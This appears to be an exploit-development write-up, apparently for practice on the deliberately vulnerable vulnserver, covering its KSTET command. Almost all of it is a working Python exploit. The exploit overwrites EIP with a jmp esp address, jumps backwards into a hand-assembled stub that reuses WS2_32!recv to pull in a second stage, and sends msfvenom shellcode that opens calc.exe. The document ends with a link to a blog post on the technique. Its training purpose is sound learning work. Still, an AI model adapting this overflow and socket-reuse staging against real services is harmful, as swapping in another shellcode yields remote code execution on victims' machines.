## <ins>KSTET</ins>

Excat offset: 70
Available buffer space: 20 bytes

Instead of socket reconstruction, WS2_32!recv reuse will be used:

```Python
#!/usr/bin/python3

import socket, sys
from struct import pack
from time import sleep

ip = sys.argv[1]
port = 9999		

length = 70
prefix = b'KSTET '
buffer = None
eip = pack('<L', 0x625011af)        # jmp esp
jumpcode = b'\xE9\xB1\xFF\xFF\xFF'  # backwards jump 

# WS2_32!recv() reuse method

re = b'\x54'       # push esp
re += b'\x58'       # pop eax 
re += b'\x66\x05\x88\x01'       # add ax, 0x188 

re += b'\x83\xEC\x64'   # sub esp, 0x64

re += b'\x8B\x10'   # mov edx, [eax]
# EDX now contains the address to the socket descriptor

re += b'\x31\xC0'       # xor eax, eax 
re += b'\x50'           # push eax (flags param)
re += b'\xb4\x02'       # mov ah, 0x2
re += b'\x50'           # push eax (buf len 512 bytes)

re += b'\x54'       # push esp
re += b'\x58'       # pop eax 
re += b'\x04\x52'   # add al, 0x64 
re += b'\x50'       # push eax (buf)

re += b'\x52'       # push edx (socket descriptor)

re += b'\xB8\x11\x2C\x25\x40'   # mov eax, 0x40252c11
re += b'\xC1\xE8\x08'           # shr eax, byte 0x8
re += b'\xff\xd0'       # call eax (calls WS2_32!recv)

buffer = re + b'\x90' * (length - len(re)) 
payload = prefix + buffer + eip + jumpcode 


nopsled = b'\x90' * 32
# msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f py -v shellcode EXITFUNC=thread
shellcode =  b""
shellcode += b"\xbb\x81\x82\x1b\x37\xdb\xd4\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x31\x31\x58\x13\x03\x58\x13"
shellcode += b"\x83\xe8\x7d\x60\xee\xcb\x95\xe7\x11\x34\x65"
shellcode += b"\x88\x98\xd1\x54\x88\xff\x92\xc6\x38\x8b\xf7"
shellcode += b"\xea\xb3\xd9\xe3\x79\xb1\xf5\x04\xca\x7c\x20"
shellcode += b"\x2a\xcb\x2d\x10\x2d\x4f\x2c\x45\x8d\x6e\xff"
shellcode += b"\x98\xcc\xb7\xe2\x51\x9c\x60\x68\xc7\x31\x05"
shellcode += b"\x24\xd4\xba\x55\xa8\x5c\x5e\x2d\xcb\x4d\xf1"
shellcode += b"\x26\x92\x4d\xf3\xeb\xae\xc7\xeb\xe8\x8b\x9e"
shellcode += b"\x80\xda\x60\x21\x41\x13\x88\x8e\xac\x9c\x7b"
shellcode += b"\xce\xe9\x1a\x64\xa5\x03\x59\x19\xbe\xd7\x20"
shellcode += b"\xc5\x4b\xcc\x82\x8e\xec\x28\x33\x42\x6a\xba"
shellcode += b"\x3f\x2f\xf8\xe4\x23\xae\x2d\x9f\x5f\x3b\xd0"
shellcode += b"\x70\xd6\x7f\xf7\x54\xb3\x24\x96\xcd\x19\x8a"
shellcode += b"\xa7\x0e\xc2\x73\x02\x44\xee\x60\x3f\x07\x64"
shellcode += b"\x76\xcd\x3d\xca\x78\xcd\x3d\x7a\x11\xfc\xb6"
shellcode += b"\x15\x66\x01\x1d\x52\x88\xe3\xb4\xae\x21\xba"
shellcode += b"\x5c\x13\x2c\x3d\x8b\x57\x49\xbe\x3e\x27\xae"
shellcode += b"\xde\x4a\x22\xea\x58\xa6\x5e\x63\x0d\xc8\xcd"
shellcode += b"\x84\x04\xab\x90\x16\xc4\x02\x37\x9f\x6f\x5b"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        print('[*] Sending payload')
        s.send(payload)
        
        sleep(3)

        s.send(nopsled + shellcode)

except Exception as e:
    print(e)
    sys.exit(0)
```

Blog post about WS_32.recv() socket reuse by Connor McGarr: [here](https://connormcgarr.github.io/WS32_recv()-Reuse/)